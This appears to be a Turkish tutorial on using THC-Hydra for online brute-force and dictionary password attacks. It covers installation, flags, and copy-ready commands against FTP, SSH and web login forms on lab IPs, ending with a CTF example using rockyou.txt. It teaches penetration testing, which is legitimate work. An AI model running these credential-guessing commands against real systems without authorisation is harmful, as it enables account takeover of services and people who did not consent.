# Hydra ile Çevrim İçi Parola Kırma (Brute-Force / Sözlük Saldırısı)

## 1. Hydra Nedir ve Kurulumu

THC-Hydra; ağ servislerine (SSH, FTP, HTTP/HTTPS, SMB vb.) karşı son derece hızlı çevrim içi (online) kaba kuvvet (**Brute-Force**) ve sözlük (**Dictionary Attack**) saldırıları gerçekleştiren paralel oturum destekli bir penetrasyon testi aracıdır.

### Kurulum Komutları:

- **Debian / Ubuntu / Kali Linux:**
    
    Bash
    
    ```
    sudo apt update && sudo apt install hydra -y
    ```
    
- **Fedora / RHEL:**
    
    Bash
    
    ```
    sudo dnf install hydra -y
    ```
    
- **Arch Linux:**
    
    Bash
    
    ```
    sudo pacman -S hydra
    ```
    

## 2. Temel Komut Parametreleri (Flags)

|**Parametre**|**Açıklama**|
|---|---|
|**`-l <kullanıcı>`**|Tek bir hedef kullanıcı adı belirler _(küçük 'l')_.|
|**`-L <dosya_yolu>`**|Kullanıcı adlarını bir wordlist dosyasından okur _(büyük 'L')_.|
|**`-p <parola>`**|Tek bir sabit parola dener _(küçük 'p')_.|
|**`-P <dosya_yolu>`**|Parolaları bir wordlist dosyasından (`rockyou.txt` vb.) dener _(büyük 'P')_.|
|**`-t <sayı>`**|Aynı anda çalışacak iş parçacığı (**thread**) sayısını belirler _(Örn: `-t 4`)_.|
|**`-s <port>`**|Servis varsayılan dışı bir portta çalışıyorsa portu belirtir _(Örn: `-s 8080`)_.|
|**`-V` / `-vV`**|Ayrıntılı mod (**Verbose**): Yapılan her parola denemesini anlık ekrana basar.|
|**`-f`**|İlk geçerli parola eşleşmesi bulunduğunda saldırıyı otomatik durdurur.|
|**`-o cikti.txt`**|Bulunan kimlik bilgilerini bir metin dosyasına kaydeder.|

## 3. Protokol Bazlı Temel Örnekler

### A) FTP Parola Kırma (Port 21)

Bash

```
hydra -l user -P passlist.txt ftp://192.168.1.50
```

### B) SSH Parola Kırma (Port 22)

SSH servisleri sık bağlantılarda IP kilitlemesi yapabileceği için thread sayısını (`-t 4`) düşük tutmak bağlantının düşmesini önler:

Bash

```
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.50 -t 4 ssh
```

## 4. Web Formlarına Yönelik Saldırılar (`http-post-form`)

Web arayüzlerindeki oturum formlarına brute-force yaparken istek türü, form alanları ve sunucunun başarısız girişte döndürdüğü hata mesajı analiz edilmelidir (_Tarayıcı Geliştirici Araçları $\rightarrow$ Network / Ağ sekmesi_).

### Genel Sözdizimi:

Bash

```
hydra -l <kullanıcı> -P <wordlist> <HEDEF_IP> http-post-form "<dizin>:<gövde_verisi>:<hata_koşulu>" -V
```

### Parametre Formatının İncelenmesi:

Plaintext

```
"<path>:<login_credentials>:<invalid_response>"
   │              │                     │
   │              │                     └─► Hatalı girişte dönen metin (Örn: F=incorrect)
   │              └─► Form alan isimleri ve değişkenler (user=^USER^&pass=^PASS^)
   └─► Formun bulunduğu URL/dizin (Örn: /login.php)
```

- **Dizin (`<path>`):** Formun gönderildiği uç nokta (`/` veya `/login.php`).
    
- **Gövde Verisi (`<login_credentials>`):** Formdaki `name` alanları. Kullanıcı adı değişkeni `^USER^`, parola değişkeni `^PASS^` ile tanımlanır.
    
- **Hata Koşulu (`<invalid_response>`):** Giriş reddedildiğinde sayfada çıkan metin. Başına **`F=`** (_Failure_) eklenir _(Örn: `F=incorrect`, `F=Invalid credentials`)_.
    

### Örnek Web Form Komutları:

- **Standart Portta (Port 80) Web Giriş Formu:**
    
    Bash
    
    ```
    hydra -l admin -P wordlist.txt 10.10.10.50 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    ```
    
- **Özel Portta (Örn: Port 8080) Çalışan Form:**
    
    Bash
    
    ```
    hydra -l admin -P wordlist.txt 10.10.10.50 http-post-form "/login:user=^USER^&pass=^PASS^:F=Failed" -s 8080 -V
    ```
    
- **Gerçek CTF Senaryosu (Molly kullanıcısı için `rockyou.txt` denemesi):**
    
    Bash
    
    ```
    hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.112.141.63 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    ```